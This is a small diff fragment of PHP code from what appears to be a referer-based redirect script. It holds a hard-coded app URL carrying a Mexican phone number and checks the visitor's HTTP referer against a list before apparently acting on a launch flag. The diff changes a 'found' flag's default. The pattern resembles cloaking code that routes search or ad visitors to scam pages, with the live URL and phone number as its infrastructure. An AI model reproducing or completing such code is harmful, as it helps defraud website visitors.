@@ -11,7 +11,7 @@
     
     $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=+52-74-4362-0212'; //mexique
 
-    $encontrado=true;
+    $encontrado=false;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
         foreach ($referers as $referer){
             $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
